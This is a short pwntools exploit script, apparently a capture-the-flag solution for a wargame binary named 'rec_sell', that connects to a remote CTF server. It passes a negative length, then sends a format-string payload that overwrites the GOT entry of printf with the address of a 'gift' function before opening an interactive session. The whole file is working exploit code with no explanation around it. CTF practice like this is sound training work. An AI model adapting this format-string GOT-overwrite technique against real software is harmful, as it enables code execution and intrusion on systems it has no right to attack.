from pwn import *
r=remote("ctf.subhack.xyz",1002)
#r=process("/GitHub/Writeup/Wargame/PwnPwn/pwn/rec_sell")
b=ELF("/GitHub/Writeup/Wargame/PwnPwn/pwn/rec_sell")
context.log_level='debug'
gift=b.symbols['gift']
printf=b.got['printf']

r.sendlineafter("input :","1")
r.sendlineafter("length :","-1")

base='%6$x'
payload='%{}c%9$ln'.format(gift).ljust(24,' ').encode()
payload+=p64(printf)
r.sendlineafter("title : ",payload)
r.sendlineafter("input : ","4")
pause()
r.sendlineafter(" : ","1")

r.interactive()